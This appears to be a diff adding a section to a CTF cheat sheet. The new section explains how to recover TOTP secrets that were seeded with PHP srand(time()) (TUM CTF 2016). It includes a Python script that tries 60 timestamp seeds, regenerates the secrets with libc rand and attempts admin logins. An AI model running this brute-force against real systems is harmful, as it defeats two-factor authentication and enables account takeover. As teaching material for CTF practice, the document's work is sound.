@@ -11,6 +11,7 @@
 - [Host Header Bypass](#host-header-bypass)
 - [Broken Auth: Always-True Hash Check (0xFun 2026)](#broken-auth-always-true-hash-check-0xfun-2026)
 - [Affine Cipher OTP Brute-Force (UTCTF 2026)](#affine-cipher-otp-brute-force-utctf-2026)
+- [TOTP Recovery via PHP srand(time()) Seed Weakness (TUM CTF 2016)](#totp-recovery-via-php-srandtime-seed-weakness-tum-ctf-2016)
 - [/proc/self/mem via HTTP Range Requests (UTCTF 2024)](#procselfmem-via-http-range-requests-utctf-2024)
 - [Custom Linear MAC/Signature Forgery (Nullcon 2026)](#custom-linear-macsignature-forgery-nullcon-2026)
 - [Hidden API Endpoints](#hidden-api-endpoints)
@@ -192,6 +193,45 @@ for otp in otps:
 **Key insight:** Any cipher operating on a small alphabet (26 letters) with two parameters constrained by modular arithmetic has a tiny keyspace. Recognize the affine cipher structure (`a*x + b mod m`), calculate the exact number of valid `(mult, add)` pairs, and brute-force all of them. With 312 candidates, this completes in seconds even without parallelism.
 
 **Detection:** OTP endpoint with no rate limiting. Traffic captures showing `mult`/`add` or similar cipher parameters. OTP values that are the same length as the username (character-by-character transformation).
+
+---
+
+## TOTP Recovery via PHP srand(time()) Seed Weakness (TUM CTF 2016)
+
+TOTP implementations seeded with `srand(time())` during registration produce predictable secrets when the registration timestamp is known or can be narrowed.
+
+```python
+import pyotp
+import time
+import ctypes
+
+# If admin registered at 2015-11-28 21:21:XX (seconds unknown)
+# PHP srand(time()) seeds the PRNG with Unix timestamp
+# Only 60 possible seeds to try (one per second in the minute)
+
+base_time = int(datetime.datetime(2015, 11, 28, 21, 21, 0).timestamp())
+
+for second in range(60):
+    seed = base_time + second
+    # Replicate PHP's rand() sequence after srand(seed)
+    libc = ctypes.CDLL("libc.so.6")
+    libc.srand(seed)
+
+    # Generate the same secret the server generated
+    charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZ234567"
+    secret = ""
+    for _ in range(16):
+        secret += charset[libc.rand() % len(charset)]
+
+    # Generate current TOTP and try login
+    totp = pyotp.TOTP(secret)
+    token = totp.now()
+    if try_login("admin", token):
+        print(f"Found seed: {seed}, secret: {secret}")
+        break
+```
+
+**Key insight:** When TOTP secrets are generated using `srand(time())`, knowing the approximate registration time (even to the minute) reduces the seed space to 60 values. Check blog posts, admin panels, or user creation timestamps for registration time hints.
 
 ---
 
